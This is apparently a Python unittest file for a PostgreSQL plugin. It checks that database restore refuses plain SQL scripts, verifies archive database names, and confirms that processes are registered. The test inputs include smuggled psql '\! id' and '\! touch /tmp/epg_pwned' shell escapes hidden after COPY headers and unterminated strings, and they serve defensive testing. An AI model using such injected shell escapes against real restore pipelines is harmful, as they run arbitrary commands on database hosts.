    "text after copy header": "COPY t FROM stdin; \\! id\n1\n\\.\n",
    "unterminated string": "SELECT 'never closed\n\\! id\n",
}


COPY_CTE_THEN_SHELL = "COPY (WITH stdin AS (VALUES (1)) SELECT * FROM stdin) TO STDOUT;\n\\! touch /tmp/epg_pwned\n"


class PlainSqlRefused(unittest.TestCase):
    """Restore takes pg_dump archives only: plain SQL never reaches a client program.

    The psql path ran every one of these on b768413c0, and the COPY-CTE script on
    4599de950 (its lexer read the lines after it as COPY data).
    """

    def restore(self, script: str) -> tuple[list[list[str]], Exception | None]:
        calls: list[list[str]] = []

        def fake_run(argv: list[str], **_kw: Any) -> subprocess.CompletedProcess[bytes]:
            calls.append(argv)
            return subprocess.CompletedProcess(argv, 0, b"", b"")

        with tempfile.TemporaryDirectory() as workspace:
            dump = Path(workspace) / "dump.sql"
            dump.write_text(script, encoding="utf-8")
            with patch.object(client_tools.subprocess, "run", fake_run), patch.object(client_tools, "resolve_tool", lambda name, _bin: f"/opt/pg/bin/{name}"):
                try:
                    client_tools.restore_database(DSN, {"input_path": str(dump), "exit_on_error": True}, passthrough, SETTINGS)
                except Exception as exc:  # the refusal under test
                    return calls, exc
        return calls, None

    def test_every_plain_sql_input_is_refused_before_any_program_runs(self) -> None:
        scripts = {"copy cte then shell": COPY_CTE_THEN_SHELL, "real pg_dump plain": PG_DUMP_PLAIN, **DANGEROUS_SCRIPTS}
        for label, script in scripts.items():
            with self.subTest(label=label):
                calls, error = self.restore(script)
                self.assertIsInstance(error, client_tools.ClientToolError, label)
                self.assertEqual(getattr(error, "code", None), "external_pg.plain_sql_restore_refused")
                self.assertIn("run_script", str(error))
                self.assertEqual(calls, [], label)

    def test_archive_create_checks_the_archive_database_name(self) -> None:
        listing = f";\n; Archive created at 2026-11-07 17:20:00 UTC\n;     dbname: {os.environ['SOLET_NAME']}\n;     TOC Entries: 12\n;     Format: CUSTOM\n"
        self.assertEqual(client_tools.archive_dbname(listing), os.environ["SOLET_NAME"])
        platform_host = ExternalDsn(name="local", host="localhost", port=5432, dbname="scratch", user="u", password="", sslmode="disable")
        calls: list[list[str]] = []

        def fake_run(argv: list[str], **_kw: Any) -> subprocess.CompletedProcess[bytes]:
            calls.append(argv)
            return subprocess.CompletedProcess(argv, 0, listing.encode(), b"")

        with tempfile.TemporaryDirectory() as workspace:
            archive = Path(workspace) / "walk.dump"
            archive.write_bytes(b"PGDMP" + b"\x00" * 600)
            with patch.object(client_tools.subprocess, "run", fake_run), patch.object(client_tools, "resolve_tool", lambda name, _bin: f"/opt/pg/bin/{name}"):
                with self.assertRaises(ExternalPgGuardError):
                    client_tools.restore_database(platform_host, {"input_path": str(archive), "create": True, "clean": True}, passthrough, SETTINGS)
        self.assertEqual([argv[1] for argv in calls], ["--list"])


class Registration(unittest.TestCase):
    """Each process needs its decorator, edge entry and knowledge-base JSON."""

    def test_three_artifacts_per_process(self) -> None:
        from ananta.core.plugins.action_discovery import discover_actions

        plugin = ExternalPostgresPlugin()
        decorated = {action.name: action for action in discover_actions(plugin)}
        edges = plugin.get_edge_process_definitions()
        kb = ROOT / "plugins/external_postgres_plugin/knowledge_base/processes"
        docs = {path.stem: json.loads(path.read_text(encoding="utf-8")) for path in kb.glob("*.json")}
        self.assertEqual(set(decorated), set(edges))
        self.assertEqual(set(decorated), set(docs))
        self.assertEqual(len(decorated), 14)
        for name in decorated:
            with self.subTest(process=name):
                doc = docs[name]
                self.assertEqual(doc["process_key"], f"plugin::external_postgres_plugin::{name}")
                result_type = doc["result_processor_customizations"]["result_type"]
                edge_type = edges[name].result_processor_template_customizations.result_type  # type: ignore[union-attr]
                self.assertEqual(edge_type, result_type)
                self.assertNotIn("read-only", doc["description"].lower().replace("is read-only there", ""))
        for name in NEW_PROCESSES:
            with self.subTest(process=name):
                self.assertTrue(200 <= len(docs[name]["embedding_description"]) <= 400)

    def test_operations_are_named_in_the_descriptions(self) -> None:
        kb = ROOT / "plugins/external_postgres_plugin/knowledge_base/processes"
        for name, operations in (
            ("copy", copy_actions.OPERATIONS),
            ("activity", admin_actions.ACTIVITY_OPERATIONS),
            ("statistics", admin_actions.STATISTICS_OPERATIONS),
        ):
            description = json.loads((kb / f"{name}.json").read_text(encoding="utf-8"))["description"]
            for operation in operations:
                self.assertIn(operation, description, f"{name}.{operation}")

    def test_every_declared_vendor_option_is_a_process_parameter(self) -> None:
        from ananta.core.plugins.action_discovery import discover_actions

        actions = {action.name: action for action in discover_actions(ExternalPostgresPlugin())}
        self.assertTrue(set(client_tools.PG_DUMP_OPTIONS) <= set(actions["dump_database"].parameters))
        self.assertTrue(set(client_tools.PG_RESTORE_OPTIONS) <= set(actions["restore_database"].parameters))
        self.assertTrue(set(copy_actions.COPY_OPTIONS) <= set(actions["copy"].parameters))


if __name__ == "__main__":
    unittest.main(verbosity=1)
